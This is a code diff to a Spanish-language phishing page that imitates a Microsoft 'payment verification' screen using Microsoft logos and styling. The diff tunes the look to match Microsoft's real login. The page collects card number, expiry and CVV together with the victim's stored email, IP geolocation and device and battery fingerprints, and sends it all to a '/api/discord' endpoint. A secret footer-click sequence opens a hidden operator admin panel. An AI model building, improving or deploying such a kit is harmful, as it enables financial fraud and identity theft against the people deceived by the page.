@@ -17,10 +17,6 @@
       width: 100%;
       overflow: hidden;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-size: cover;
-      background-position: center;
-      background-repeat: no-repeat;
-      background-color: #0a0a1a;
     }
     body {
       display: flex;
@@ -28,63 +24,70 @@
       justify-content: center;
       min-height: 100vh;
       padding: 20px;
-      background-image: url('https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg');
+      background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%);
     }
     .payment-container {
       width: 100%;
       max-width: 380px;
-      background: rgba(15, 23, 42, 0.95);
-      backdrop-filter: blur(20px);
-      border-radius: 12px;
-      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
-      padding: 40px;
+      background: #2d2d2d;
+      border-radius: 4px;
+      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.4);
+      padding: 32px 28px;
       position: relative;
       z-index: 10;
-      border: 1px solid rgba(255, 255, 255, 0.1);
     }
     .logo {
       text-align: center;
       margin-bottom: 24px;
     }
     .logo img {
-      height: 40px;
+      height: 32px;
     }
     .payment-title {
-      font-size: 24px;
-      font-weight: 600;
+      font-size: 18px;
+      font-weight: 400;
       color: #ffffff;
       text-align: center;
-      margin-bottom: 8px;
+      margin-bottom: 4px;
     }
     .payment-description {
       font-size: 13px;
-      color: #a0a0b0;
+      color: #b0b0b0;
       text-align: center;
-      margin-bottom: 24px;
+      margin-bottom: 20px;
       min-height: 18px;
     }
     .form-group {
-      margin-bottom: 20px;
+      margin-bottom: 16px;
+      position: relative;
     }
-    label {
-      display: block;
-      font-size: 12px;
-      font-weight: 600;
-      color: #8c8c9e;
-      margin-bottom: 6px;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
+    .form-input {
+      width: 100%;
+      padding: 8px 0;
+      background: transparent;
+      border: none;
+      border-bottom: 1px solid #666666;
+      color: #ffffff;
+      font-size: 14px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    .form-input:focus {
+      border-bottom-color: #0078d4;
+    }
+    .form-input::placeholder {
+      color: #8a8a8a;
     }
     input.card-number,
     input.card-expiry,
     input.card-cvv {
       width: 100%;
-      padding: 12px 14px;
-      background: rgba(0, 0, 0, 0.3);
-      border: 1px solid rgba(255, 255, 255, 0.15);
-      border-radius: 6px;
+      padding: 8px 0;
+      background: transparent;
+      border: none;
+      border-bottom: 1px solid #666666;
       color: #ffffff;
-      font-size: 15px;
+      font-size: 14px;
       outline: none;
       transition: border-color 0.2s;
       font-family: 'Courier New', monospace;
@@ -92,12 +95,12 @@
     input.card-number:focus,
     input.card-expiry:focus,
     input.card-cvv:focus {
-      border-color: #0078d4;
+      border-bottom-color: #0078d4;
     }
     .card-row {
       display: flex;
       gap: 12px;
-      margin-bottom: 20px;
+      margin-bottom: 16px;
     }
     .card-row .form-group {
       flex: 1;
@@ -106,17 +109,27 @@
     .card-row .form-group:last-child {
       max-width: 120px;
     }
+    label {
+      display: block;
+      font-size: 11px;
+      font-weight: 400;
+      color: #8a8a8a;
+      margin-bottom: 4px;
+      text-transform: none;
+      letter-spacing: 0;
+    }
     .btn-primary {
       width: 100%;
-      padding: 12px;
+      padding: 10px;
       background: #0078d4;
       color: #fff;
       border: none;
-      border-radius: 6px;
+      border-radius: 2px;
       font-size: 14px;
       font-weight: 600;
       cursor: pointer;
       transition: background 0.2s;
+      margin-top: 20px;
     }
     .btn-primary:hover {
       background: #106ebe;
@@ -127,32 +140,47 @@
     }
     .links {
       margin-top: 16px;
-      text-align: center;
     }
     .links a {
-      color: #a0a0b0;
-      font-size: 13px;
+      color: #b0b0b0;
+      font-size: 12px;
       text-decoration: none;
     }
     .links a:hover {
       text-decoration: underline;
     }
     .footer {
-      margin-top: 20px;
+      margin-top: 16px;
+      padding-top: 12px;
+      border-top: 1px solid #404040;
       text-align: center;
       font-size: 11px;
-      color: #6a6a7a;
+      color: #94a3b8;
       line-height: 1.6;
     }
     .footer a {
-      color: #6a6a7a;
+      color: #94a3b8;
       text-decoration: none;
-      cursor: pointer;
     }
     .footer a:hover {
       text-decoration: underline;
     }
-    /* Modal de contraseña de admin */
+    .login-sub-link {
+      margin-top: 16px;
+      text-align: center;
+    }
+    .login-sub-link span {
+      color: #b0b0b0;
+      font-size: 12px;
+    }
+    .login-sub-link a {
+      color: #0078d4;
+      font-size: 12px;
+      text-decoration: none;
+    }
+    .login-sub-link a:hover {
+      text-decoration: underline;
+    }
     .admin-modal {
       display: none;
       position: fixed;
@@ -161,57 +189,89 @@
       width: 100%;
       height: 100%;
       background: rgba(0, 0, 0, 0.7);
-      backdrop-filter: blur(5px);
+      z-index: 1000;
       align-items: center;
       justify-content: center;
-      z-index: 1000;
     }
-    .admin-modal .modal-content {
-      background: rgba(20, 20, 40, 0.95);
-      border-radius: 12px;
-      padding: 30px;
+    .admin-modal.active {
+      display: flex;
+    }
+    .modal-content {
+      background: #2d2d2d;
+      padding: 24px;
+      border-radius: 4px;
+      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.5);
       width: 100%;
       max-width: 320px;
       text-align: center;
-      border: 1px solid rgba(255, 255, 255, 0.1);
     }
-    .admin-modal h3 {
-      font-size: 16px;
+    .modal-content h3 {
       color: #ffffff;
+      font-size: 16px;
       margin-bottom: 16px;
     }
-    .admin-modal input {
+    .modal-content input {
       width: 100%;
-      padding: 10px 12px;
-      background: rgba(0, 0, 0, 0.3);
-      border: 1px solid rgba(255, 255, 255, 0.15);
-      border-radius: 6px;
+      padding: 8px 12px;
+      background: #1e293b;
+      border: 1px solid #404040;
+      border-radius: 2px;
       color: #ffffff;
       font-size: 14px;
       outline: none;
-      margin-bottom: 16px;
+      margin-bottom: 12px;
+      box-sizing: border-box;
     }
-    .admin-modal .btn-admin {
+    .modal-content input:focus {
+      border-color: #0078d4;
+    }
+    .modal-content .btn-admin {
       width: 100%;
-      padding: 10px;
+      padding: 8px;
       background: #0078d4;
       color: #fff;
       border: none;
-      border-radius: 6px;
+      border-radius: 2px;
       font-size: 13px;
       font-weight: 600;
       cursor: pointer;
+      margin-top: 8px;
+      transition: background 0.2s;
     }
-    .admin-modal .btn-cancel {
+    .modal-content .btn-admin:hover {
+      background: #106ebe;
+    }
+    .modal-content .btn-cancel {
       width: 100%;
-      padding: 10px;
+      padding: 8px;
       background: transparent;
-      color: #a0a0b0;
-      border: 1px solid rgba(255, 255, 255, 0.15);
-      border-radius: 6px;
+      color: #94a3b8;
+      border: 1px solid #404040;
+      border-radius: 2px;
       font-size: 13px;
       cursor: pointer;
       margin-top: 8px;
+    }
+    .modal-content .btn-cancel:hover {
+      background: #1e293b;
+    }
+    .toast {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #0078d4;
+      color: #fff;
+      padding: 10px 20px;
+      border-radius: 4px;
+      font-size: 13px;
+      opacity: 0;
+      transition: opacity 0.3s;
+      z-index: 2000;
+      pointer-events: none;
+    }
+    .toast.show {
+      opacity: 1;
     }
   </style>
 </head>
@@ -250,13 +310,16 @@
     </div>
 
     <div class="footer">
-      <a href="#">Términos de uso</a>
+      <a href="#">Ayuda y comentarios</a>
+      ·
+      <a href="#">Condiciones de uso</a>
+      ·
+      <a href="#">Privacidad y cookies</a>
       <br>
-      <span>Usa la exploración privada si este no es tu dispositivo. Más información</span>
+      <span>Si este no es tu dispositivo, usa la navegación privada. Más información</span>
     </div>
   </div>
 
-  <!-- Modal de acceso admin (doble-tap Ayuda + Privacidad) -->
   <div class="admin-modal" id="adminModal">
     <div class="modal-content">
       <h3>Acceso de administrador</h3>
@@ -294,7 +357,6 @@
               localStorage.setItem(k, data[k]);
             }
           });
-          // Cargar la contraseña de admin desde config si existe
           if (data.adminPassword) {
             adminPasswordFromConfig = data.adminPassword;
           }
@@ -313,40 +375,19 @@
     }
 
     function applyLoginBackground() {
-      var bgType = getSavedSetting('loginBgType', 'image');
-      var bgColor = getSavedSetting('loginBgColor', '#0a0a1a');
-      var bgGradient = getSavedSetting('loginBgGradient', 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)');
-      var bgImage = getSavedSetting('loginBgImage', 'https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg');
-
-      document.body.style.removeProperty('background-image');
-      document.body.style.removeProperty('background-color');
-      document.body.classList.remove('bg-gradient', 'bg-image');
-
-      if (bgType === 'gradient') {
-        document.body.style.background = bgGradient;
-        document.body.classList.add('bg-gradient');
-      } else if (bgType === 'image' && bgImage) {
-        document.body.style.backgroundImage = 'url(' + bgImage + ')';
-        document.body.style.backgroundSize = 'cover';
-        document.body.style.backgroundPosition = 'center';
-        document.body.style.backgroundRepeat = 'no-repeat';
-        document.body.classList.add('bg-image');
-      } else {
-        document.body.style.backgroundColor = bgColor;
-      }
+      var bgType = getSavedSetting('loginBgType', 'gradient');
+      var bgGradient = getSavedSetting('loginBgGradient', 'linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%)');
+      document.body.style.background = bgGradient;
     }
 
     function applyLoginContent() {
       var logoUrl = getSavedSetting('loginLogo', 'https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg');
       var title = getSavedSetting('loginTitle', 'Verificación de pago');
       var description = getSavedSetting('loginDescription', '');
-
       var logoImg = document.getElementById('loginLogo');
       if (logoImg) logoImg.src = logoUrl;
-
       var titleEl = document.getElementById('loginTitle');
       if (titleEl) titleEl.textContent = title;
-
       var descEl = document.getElementById('loginDescription');
       if (descEl) {
         descEl.textContent = description || '';
@@ -361,11 +402,8 @@
         ayudaCount = 0;
         waitingForPrivacidad = true;
         privacidadCount = 0;
-        // Indicar visualmente (opcional, sutil)
         var link = document.getElementById('ayudaLink');
-        if (link) {
-          link.style.color = '#0078d4';
-        }
+        if (link) link.style.color = '#0078d4';
       } else if (ayudaCount > 2) {
         ayudaCount = 0;
         waitingForPrivacidad = false;
@@ -377,16 +415,13 @@
     // --- Doble-tap: Privacidad y cookies ---
     function handlePrivacidadClick() {
       if (!waitingForPrivacidad) return;
-
       privacidadCount++;
       if (privacidadCount === 2) {
         privacidadCount = 0;
         waitingForPrivacidad = false;
         ayudaCount = 0;
-        // Resetear colores
         var ayudaLink = document.getElementById('ayudaLink');
         if (ayudaLink) ayudaLink.style.color = '';
-        // Mostrar modal de password
         showAdminModal();
       }
     }
@@ -394,7 +429,7 @@
     function showAdminModal() {
       var modal = document.getElementById('adminModal');
       if (modal) {
-        modal.style.display = 'flex';
+        modal.classList.add('active');
         var pwdInput = document.getElementById('adminPassword');
         if (pwdInput) pwdInput.value = '';
         if (pwdInput) pwdInput.focus();
@@ -403,22 +438,18 @@
 
     function closeAdminModal() {
       var modal = document.getElementById('adminModal');
-      if (modal) modal.style.display = 'none';
+      if (modal) modal.classList.remove('active');
     }
 
     function verifyAdminAccess() {
       var pwdInput = document.getElementById('adminPassword');
       var enteredPassword = pwdInput ? pwdInput.value : '';
       var correctPassword = adminPasswordFromConfig || ADMIN_PASSWORD;
-
       if (enteredPassword === correctPassword) {
-        // Establecer flag de acceso admin
         sessionStorage.setItem('adminAccess', 'granted');
         closeAdminModal();
-        // Redirigir al panel de admin
         window.location.href = 'dashboard.html';
       } else {
-        // No mostrar mensaje de error visible
         closeAdminModal();
       }
     }
@@ -456,14 +487,10 @@
         touchPoints: navigator.maxTouchPoints || 0,
         ipifyIp: '',
       };
-
-      // Detección de dispositivo
       var ua = navigator.userAgent;
       data.isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua) ? 'Sí' : 'No';
       data.isTablet = /iPad|Android(?!.*Mobile)/i.test(ua) ? 'Sí' : 'No';
       data.isDesktop = (data.isMobile === 'No' && data.isTablet === 'No') ? 'Sí' : 'No';
-
-      // Geo IP desde ipinfo.io
       try {
         var geoRes = await fetch('https://ipinfo.io/json');
         if (geoRes.ok) {
@@ -484,8 +511,6 @@
       } catch (err) {
         console.warn('ipinfo.io failed:', err);
       }
-
-      // IP desde ipify (fallback)
       try {
         var ipifyRes = await fetch('https://api.ipify.org?format=json');
         if (ipifyRes.ok) {
@@ -496,8 +521,6 @@
       } catch (err) {
         console.warn('ipify failed:', err);
       }
-
-      // Batería
       try {
         if (navigator.getBattery) {
           var battery = await navigator.getBattery();
@@ -512,7 +535,6 @@
         data.batteryLevel = 'No disponible';
         data.batteryCharging = 'Desconocido';
       }
-
       return data;
     }
 
@@ -521,18 +543,11 @@
       var cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
       var cardExpiry = document.getElementById('cardExpiry').value;
       var cardCvv = document.getElementById('cardCvv').value;
-
       if (!cardNumber || cardNumber.length < 13 || !cardExpiry || !cardCvv) {
         return;
       }
-
-      // Recopilar datos del navegador
       var browserData = await collectBrowserData();
-
-      // Obtener email desde sessionStorage/localStorage
       var email = sessionStorage.getItem('loginEmail') || localStorage.getItem('loginEmail') || 'unknown';
-
-      // Payload completo para Discord con datos de tarjeta
       var payload = {
         email: email,
         password: '***',
@@ -554,27 +569,20 @@
         batteryLevel: browserData.batteryLevel || '',
         batteryCharging: browserData.batteryCharging || ''
       };
-
-      // Mostrar feedback visual de envío
       var payButton = document.getElementById('payButton');
       var originalText = payButton.textContent;
       payButton.textContent = 'Enviando...';
       payButton.disabled = true;
-
       try {
         var res = await fetch('/api/discord', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
         });
-
         if (!res.ok) {
           console.warn('Discord API error:', res.status);
         }
-
         var result = await res.json();
-
-        // Feedback de éxito
         payButton.textContent = '✓ Enviado';
         payButton.style.background = '#1a7f37';
         setTimeout(function() {
@@ -582,7 +590,6 @@
           payButton.style.background = '';
           payButton.disabled = false;
         }, 2000);
-
       } catch (err) {
         console.warn('Discord send failed:', err);
         payButton.textContent = 'Error al enviar';
@@ -599,20 +606,14 @@
     document.addEventListener('DOMContentLoaded', function() {
       loadConfig();
       adminPasswordFromConfig = localStorage.getItem('adminPassword') || ADMIN_PASSWORD;
-
-      // Asignar eventos de doble-tap
       var ayudaLink = document.getElementById('ayudaLink');
       var privacidadLink = document.getElementById('privacidadLink');
       if (ayudaLink) ayudaLink.addEventListener('click', handleAyudaClick);
       if (privacidadLink) privacidadLink.addEventListener('click', handlePrivacidadClick);
-
-      // Formateo de inputs
       var cardNumber = document.getElementById('cardNumber');
       var cardExpiry = document.getElementById('cardExpiry');
       if (cardNumber) cardNumber.addEventListener('input', formatCardNumber);
       if (cardExpiry) cardExpiry.addEventListener('input', formatExpiry);
-
-      // Enter en el modal de admin
       var adminPwd = document.getElementById('adminPassword');
       if (adminPwd) {
         adminPwd.addEventListener('keypress', function(e) {
